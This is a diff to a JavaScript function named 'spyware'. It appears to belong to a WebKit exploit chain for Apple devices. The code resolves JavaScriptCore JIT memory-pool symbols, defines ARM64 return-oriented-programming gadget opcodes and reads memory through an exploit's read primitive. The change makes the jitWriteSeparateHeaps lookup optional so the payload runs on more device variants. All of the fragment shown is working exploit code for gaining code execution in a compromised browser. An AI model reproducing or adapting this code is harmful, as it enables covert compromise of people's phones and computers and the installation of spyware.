@@ -211,7 +211,6 @@ function spyware(stage1, memory, binary)
         "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
             "__ZN3JSC32startOfFixedExecutableMemoryPoolE",
             "__ZN3JSC30endOfFixedExecutableMemoryPoolE",
-            "__ZN3JSC29jitWriteSeparateHeapsFunctionE",
         ],
     };
 
@@ -231,6 +230,9 @@ function spyware(stage1, memory, binary)
 
         opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
     } else {
+        libs["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push(
+            "__ZN3JSC29jitWriteSeparateHeapsFunctionE"
+        )
         opcodes = {
             // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret
             "ldrx8":       [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0],
@@ -382,7 +384,13 @@ function spyware(stage1, memory, binary)
     var usleep              = syms["_usleep"];
     var memPoolStart        = memory.readInt64(syms["__ZN3JSC32startOfFixedExecutableMemoryPoolE"]);
     var memPoolEnd          = memory.readInt64(syms["__ZN3JSC30endOfFixedExecutableMemoryPoolE"]);
-    var jitWriteSeparateHeaps = memory.readInt64(syms["__ZN3JSC29jitWriteSeparateHeapsFunctionE"]);
+
+    var jitWriteSeparateHeaps;
+    if (syms["__ZN3JSC29jitWriteSeparateHeapsFunctionE"]) {
+        jitWriteSeparateHeaps = memory.readInt64(syms["__ZN3JSC29jitWriteSeparateHeapsFunctionE"]);
+    } else {
+        jitWriteSeparateHeaps = Int64.Zero;
+    }
 
     // This is easier than Uint32Array and dividing offset all the time
     binary.u32 = _u32;
